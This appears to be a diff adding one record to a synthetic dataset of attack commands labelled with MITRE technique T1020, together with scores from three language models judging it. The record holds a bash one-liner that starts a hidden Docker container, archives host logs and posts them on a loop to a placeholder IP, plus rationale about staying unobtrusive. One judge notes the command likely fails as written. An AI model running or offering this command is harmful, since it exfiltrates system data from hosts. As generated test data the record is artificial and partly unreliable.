@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_logs --network host -e HN=$(hostname) -v /var/log:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- \"http://203.0.113.15:8080/upload?host=$HN&type=logs&ts=$TS\"; sleep 1800; done'",
+  "explanation": "Runs a detached container that periodically archives host logs and quietly posts them over HTTP, automating exfiltration.",
+  "rationale_steps": [
+    "Leverages docker_group privileges to mount /var/log read-only into the container",
+    "Uses a while loop to automate periodic data collection",
+    "Tars and compresses logs, sending via curl with silent flags to minimize noise",
+    "Runs detached to stay unobtrusive and persistent"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-287a3a6e",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The docker run command is well-formed with balanced quoting, valid flags, and correctly structured shell constructs.",
+        "semantic_score": 2,
+        "semantic_justification": "Although it intends to periodically tar and POST logs (aligning with automated exfiltration), the curlimages/curl image’s ENTRYPOINT is curl so 'sh -c ...' becomes curl arguments rather than a loop, and the specified IP is a non-routable test address.",
+        "combined_score": 3.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-01T03:46:57.901722Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid Docker and curl flags, and correct shell syntax throughout the nested commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by creating a persistent container that periodically (every 30 minutes) compresses all system logs and sends them to an external server using HTTP POST, matching the T1020 technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:47:00.916219Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and correct nesting for shell execution within Docker.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command structure perfectly represents automated exfiltration via T1020, it is not operationally plausible as `docker run` typically requires root or docker group privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:50:34.669547Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
